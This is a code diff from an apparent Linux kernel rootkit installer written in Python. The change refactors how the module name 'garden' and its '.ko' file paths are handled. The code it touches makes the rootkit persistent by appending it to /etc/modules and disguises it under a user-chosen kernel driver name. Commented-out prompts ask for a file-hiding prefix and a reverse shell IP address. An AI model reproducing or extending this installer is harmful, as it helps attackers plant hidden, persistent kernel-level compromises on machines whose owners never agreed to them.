@@ -183,8 +183,7 @@ def enable_persistence(module_name):
 	print_status("Making rootkit persistent...")
 	if not is_module_already_persistent(module_name):
 		with open("/etc/modules", "a") as f:
-			# If the module name has a .ko extension, get rid of it.
-			f.write("\n" + module_name.replace(".ko", "") + "\n")
+			f.write("\n{}\n".format(module_name))
 		print_success("Persistence established.")
 
 
@@ -230,7 +229,7 @@ def install(kernel_version):
 	print_status("Starting rootkit installation...")
 
 	config = {}
-	config["MODULE_NAME"] = "garden.ko"
+	config["MODULE_NAME"] = "garden"
 	config["DRIVER_NAME"] = prompt("Enter the name of a kernel driver to disguise your rootkit.", "garden")
 	# config["HIDDEN_FILE_PREFIX"] = prompt("Enter prefix for files to hide.", "Garden")
 	# config["REVERSE_SHELL_IP_ADDR"] = prompt("Enter IP address for reverse shell.")
@@ -253,8 +252,8 @@ def install(kernel_version):
 	if not os.path.exists(module_dest_dir):
 		os.mkdir(module_dest_dir)
 
-	module_curr_path = "./rootkit/{}".format(config["MODULE_NAME"])
-	module_dest_path = module_dest_dir + "/" + config["MODULE_NAME"]
+	module_curr_path = "./rootkit/{}.ko".format(config["MODULE_NAME"])
+	module_dest_path = "{}/{}.ko".format(module_dest_dir, config["MODULE_NAME"])
 
 	# Move the compiled kernel module to the kernel modules directories.
 	try:
